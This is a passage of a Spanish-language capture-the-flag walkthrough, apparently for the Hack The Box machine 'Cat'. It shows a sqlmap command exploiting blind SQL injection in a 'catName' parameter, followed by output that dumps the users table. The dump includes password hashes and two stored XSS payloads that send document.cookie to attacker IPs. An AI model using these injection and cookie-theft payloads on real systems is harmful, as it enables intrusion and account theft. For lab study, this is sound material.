<li data-line="4" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Dumpear Contraseñas:</strong></p>
<ul>
<li data-line="6" dir="auto">Para cada nombre de usuario dumpeado, intenta dumpear su contraseña letra por letra.</li>
<li data-line="7" dir="auto">Suponemos que todas las contraseñas tienen una longitud fija de 32 caracteres.</li>
</ul>
</li>
<li data-line="8" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Imprimir Resultados:</strong></p>
<ul>
<li data-line="10" dir="auto">Al final, muestra una lista de usuarios y sus contraseñas correspondientes.</li>
</ul>
</li>
</ol></div><div class="el-hr"><hr></div></div></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="SQLMAP" dir="auto" class="heading" id="SQLMAP"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>SQLMAP</h2><div class="heading-children"><div class="el-p"><p dir="auto">Sqlmap tambien funciona por si no te quieres tirar varios dias </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">➜  Cat sqlmap <span class="token parameter variable">-r</span> request <span class="token parameter variable">-p</span> catName <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> <span class="token parameter variable">--tables</span> <span class="token parameter variable">--dump</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--dbms</span><span class="token operator">=</span>sqlite <span class="token parameter variable">--threads</span><span class="token operator">=</span><span class="token number">10</span>
        ___
       __H__                                                                   
 ___ ___<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">{</span><span class="token number">1.9</span><span class="token comment">#stable}                                         </span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token string">']     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>                                                      
<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span>.<span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>                                                      
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org                                   

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:04:43 /2025-02-08/

[20:04:43] [INFO] parsing HTTP request from '</span>request<span class="token string">'
[20:04:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catId=1&amp;catName=test'</span><span class="token operator">||</span><span class="token punctuation">(</span>SELECT 0x6b575974 WHERE <span class="token assign-left variable">9070</span><span class="token operator">=</span><span class="token number">9070</span> AND <span class="token assign-left variable">3453</span><span class="token operator">=</span><span class="token number">3453</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'
---
[20:04:44] [INFO] testing SQLite
[20:04:44] [INFO] confirming SQLite
[20:04:44] [INFO] actively fingerprinting SQLite
[20:04:44] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[20:04:44] [INFO] fetching tables for database: '</span>SQLite_masterdb<span class="token string">'
[20:04:44] [INFO] fetching number of tables for database '</span>SQLite_masterdb'
<span class="token punctuation">[</span><span class="token number">20</span>:04:44<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: <span class="token number">4</span>
<span class="token punctuation">[</span><span class="token number">20</span>:04:44<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieving the length of query output
<span class="token punctuation">[</span><span class="token number">20</span>:04:44<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: <span class="token number">13</span>
<span class="token punctuation">[</span><span class="token number">20</span>:04:49<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: accepted_cats             
<span class="token punctuation">[</span><span class="token number">20</span>:04:49<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieving the length of query output
<span class="token punctuation">[</span><span class="token number">20</span>:04:49<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: <span class="token number">15</span>
<span class="token punctuation">[</span><span class="token number">20</span>:04:55<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: sqlite_sequence             
<span class="token punctuation">[</span><span class="token number">20</span>:04:55<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieving the length of query output                        
<span class="token punctuation">[</span><span class="token number">20</span>:04:55<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: <span class="token number">4</span>                                                 
<span class="token punctuation">[</span><span class="token number">20</span>:04:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: cats                                              
<span class="token punctuation">[</span><span class="token number">20</span>:04:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieving the length of query output                        
<span class="token punctuation">[</span><span class="token number">20</span>:04:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: <span class="token number">5</span>                                                 
<span class="token punctuation">[</span><span class="token number">20</span>:04:59<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: <span class="token function">users</span>                                             
<span class="token operator">&lt;</span>current<span class="token operator">&gt;</span>                                                                      
<span class="token punctuation">[</span><span class="token number">4</span> tables<span class="token punctuation">]</span>                                                                     
+-----------------+                                                            
<span class="token operator">|</span> accepted_cats   <span class="token operator">|</span>                                                            
<span class="token operator">|</span> cats            <span class="token operator">|</span>                                                            
<span class="token operator">|</span> sqlite_sequence <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token function">users</span>           <span class="token operator">|</span>
+-----------------+
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">DUMP</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">$ sqlmap <span class="token parameter variable">-r</span> request <span class="token parameter variable">-p</span> catName <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--dbms</span><span class="token operator">=</span>sqlite <span class="token parameter variable">--dump</span> <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--threads</span> <span class="token number">10</span>

Table: <span class="token function">users</span>
<span class="token punctuation">[</span><span class="token number">12</span> entries<span class="token punctuation">]</span>
+---------+-------------------------------+----------------------------------+------------------------------------------------------------------------------------+
<span class="token operator">|</span> user_id <span class="token operator">|</span> email                         <span class="token operator">|</span> password                         <span class="token operator">|</span> username                                                                           <span class="token operator">|</span>
+---------+-------------------------------+----------------------------------+------------------------------------------------------------------------------------+
<span class="token operator">|</span> <span class="token number">1</span>       <span class="token operator">|</span> axel2017@gmail.com            <span class="token operator">|</span> d1bbba3670feb9435c9841e46e60ee2f <span class="token operator">|</span> axel                                                                               <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">2</span>       <span class="token operator">|</span> rosamendoza485@gmail.com      <span class="token operator">|</span> ac369922d560f17d6eeb8b2c7dec498c <span class="token operator">|</span> rosa                                                                               <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">3</span>       <span class="token operator">|</span> robertcervantes2000@gmail.com <span class="token operator">|</span> 42846631708f69c00ec0c0a8aa4a92ad <span class="token operator">|</span> robert                                                                             <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">4</span>       <span class="token operator">|</span> fabiancarachure2323@gmail.com <span class="token operator">|</span> 39e153e825c4a3d314a0dc7f7475ddbe <span class="token operator">|</span> fabian                                                                             <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">5</span>       <span class="token operator">|</span> jerrysonC343@gmail.com        <span class="token operator">|</span> 781593e060f8d065cd7281c5ec5b4b86 <span class="token operator">|</span> jerryson                                                                           <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">6</span>       <span class="token operator">|</span> larryP5656@gmail.com          <span class="token operator">|</span> 1b6dce240bbfbc0905a664ad199e18f8 <span class="token operator">|</span> larry                                                                              <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7</span>       <span class="token operator">|</span> royer.royer2323@gmail.com     <span class="token operator">|</span> c598f6b844a36fa7836fba0835f1f6   <span class="token operator">|</span> royer                                                                              <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">8</span>       <span class="token operator">|</span> peterCC456@gmail.com          <span class="token operator">|</span> e41ccefa439fc454f7eadbf1f139ed8a <span class="token operator">|</span> peter                                                                              <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">9</span>       <span class="token operator">|</span> angel234g@gmail.com           <span class="token operator">|</span> 24a8ec003ac2e1b3c5953a6f95f8f565 <span class="token operator">|</span> angel                                                                              <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">10</span>      <span class="token operator">|</span> jobert2020@gmail.com          <span class="token operator">|</span> 88e4dceccd48820cf77b5cf6c08698ad <span class="token operator">|</span> jobert                                                                             <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">11</span>      <span class="token operator">|</span> <span class="token number">1234</span>@1234                     <span class="token operator">|</span> 81dc9bdb52d04dc20036dbd8313ed055 <span class="token operator">|</span> <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>document.location<span class="token operator">=</span><span class="token string">'http://10.10.14.232:2323/?c='</span>+document.cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span> <span class="token operator">|</span>                                                           
<span class="token operator">|</span> <span class="token number">12</span>      <span class="token operator">|</span> lol@htb.com                   <span class="token operator">|</span> 81dc9bdb52d04dc20036dbd8313ed055 <span class="token operator">|</span> <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>document.location<span class="token operator">=</span><span class="token string">'http://10.10.14.160:1110/?c='</span>+document.cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span> <span class="token operator">|</span>                                                           

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250210152417.png" src="Pasted image 20250210152417.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250210152417.png" src="machines/cat/imgs/pasted-image-20250210152417.png"></span>]]</p></div><div class="mod-footer mod-ui"></div></div></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/cat/1-recon.html#1 - Recon"><div class="tree-item-contents heading-link" heading-name="1 - Recon"><span class="tree-item-title">1 - Recon</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="2"><a class="tree-link" href="machines/cat/1-recon.html#Nmap_Summary"><div class="tree-item-contents heading-link" heading-name="Nmap Summary"><span class="tree-item-title">Nmap Summary</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/cat/1-recon.html#Puerto_80"><div class="tree-item-contents heading-link" heading-name="Puerto 80"><span class="tree-item-title">Puerto 80</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/cat/1-recon.html#Fuzzing"><div class="tree-item-contents heading-link" heading-name="Fuzzing"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Fuzzing</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#/Login.php"><div class="tree-item-contents heading-link" heading-name="/Login.php"><span class="tree-item-title">/Login.php</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#/Contest.php"><div class="tree-item-contents heading-link" heading-name="/Contest.php"><span class="tree-item-title">/Contest.php</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#/uploads"><div class="tree-item-contents heading-link" heading-name="/uploads"><span class="tree-item-title">/uploads</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/cat/1-recon.html#/.git"><div class="tree-item-contents heading-link" heading-name="/.git"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">/.git</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#view_cat.php"><div class="tree-item-contents heading-link" heading-name="view_cat.php"><span class="tree-item-title">view_cat.php</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#delete_cat.php"><div class="tree-item-contents heading-link" heading-name="delete_cat.php"><span class="tree-item-title">delete_cat.php</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/cat/1-recon.html#XSS_en_el_endpoint_/join.php"><div class="tree-item-contents heading-link" heading-name="XSS en el endpoint /join.php"><span class="tree-item-title">XSS en el endpoint /join.php</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#**1._Vulnerabilidad_a_XSS"><div class="tree-item-contents heading-link" heading-name="**1. Vulnerabilidad a XSS"><span class="tree-item-title">**1. Vulnerabilidad a XSS</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#Script_automatizado"><div class="tree-item-contents heading-link" heading-name="Script automatizado"><span class="tree-item-title">Script automatizado</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/cat/1-recon.html#Sqli_en_accept_cat.php"><div class="tree-item-contents heading-link" heading-name="Sqli en accept_cat.php"><span class="tree-item-title">Sqli en accept_cat.php</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="2"><a class="tree-link" href="machines/cat/1-recon.html#contest.php"><div class="tree-item-contents heading-link" heading-name="contest.php"><span class="tree-item-title">contest.php</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/cat/1-recon.html#Exploit"><div class="tree-item-contents heading-link" heading-name="Exploit"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Exploit</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#SQL_BLIND_BOOLEAN_BASED"><div class="tree-item-contents heading-link" heading-name="SQL BLIND BOOLEAN BASED"><span class="tree-item-title">SQL BLIND BOOLEAN BASED</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#EXISTE_LA_TABLA_USERS?:"><div class="tree-item-contents heading-link" heading-name="EXISTE LA TABLA USERS?:"><span class="tree-item-title">EXISTE LA TABLA USERS?:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#Existe_la_columna_password?"><div class="tree-item-contents heading-link" heading-name="Existe la columna password?"><span class="tree-item-title">Existe la columna password?</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/cat/1-recon.html#Usernames_&amp;_passwords_Blind_sqli"><div class="tree-item-contents heading-link" heading-name="Usernames &amp; passwords Blind sqli"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Usernames &amp; passwords Blind sqli</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/cat/1-recon.html#1._Payload_Base_para_Extraer_Caracteres_del_nombre"><div class="tree-item-contents heading-link" heading-name="1. Payload Base para Extraer Caracteres del nombre"><span class="tree-item-title">1. 
Payload Base para Extraer Caracteres del nombre
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/cat/1-recon.html#2._Payload_Base_para_Extraer_Caracteres_de_la_password"><div class="tree-item-contents heading-link" heading-name="2. Payload Base para Extraer Caracteres de la password"><span class="tree-item-title">2. 
Payload Base para Extraer Caracteres de la password
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#3._Payload_Base_para_saber_la_longitud_de_caracteres_del_Username"><div class="tree-item-contents heading-link" heading-name="3. Payload Base para saber la longitud de caracteres del Username"><span class="tree-item-title">3. 
Payload Base para saber la longitud de caracteres del Username
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#4._Payload_Base_para_saber_la_longitud_de_caracteres_del_password"><div class="tree-item-contents heading-link" heading-name="4. Payload Base para saber la longitud de caracteres del password"><span class="tree-item-title">4. 
Payload Base para saber la longitud de caracteres del password
</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/cat/1-recon.html#Payload_!"><div class="tree-item-contents heading-link" heading-name="Payload !"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Payload !</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item mod-collapsible" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#Tecnicismos"><div class="tree-item-contents heading-link" heading-name="Tecnicismos"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Tecnicismos</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/cat/1-recon.html#**1._Función_`send_payload`:**"><div class="tree-item-contents heading-link" heading-name="**1. Función `send_payload`:**"><span class="tree-item-title"><strong>1. Función <code>send_payload</code>:</strong></span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/cat/1-recon.html#**2._Función_`dump_field`:**"><div class="tree-item-contents heading-link" heading-name="**2. Función `dump_field`:**"><span class="tree-item-title"><strong>2. Función <code>dump_field</code>:</strong></span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/cat/1-recon.html#**3._Función_`main`:**"><div class="tree-item-contents heading-link" heading-name="**3. Función `main`:**"><span class="tree-item-title"><strong>3. Función <code>main</code>:</strong></span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cat/1-recon.html#**Cómo_Funciona_el_Script**"><div class="tree-item-contents heading-link" heading-name="**Cómo Funciona el Script**"><span class="tree-item-title"><strong>Cómo Funciona el Script</strong></span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="machines/cat/1-recon.html#SQLMAP"><div class="tree-item-contents heading-link" heading-name="SQLMAP"><span class="tree-item-title">SQLMAP</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>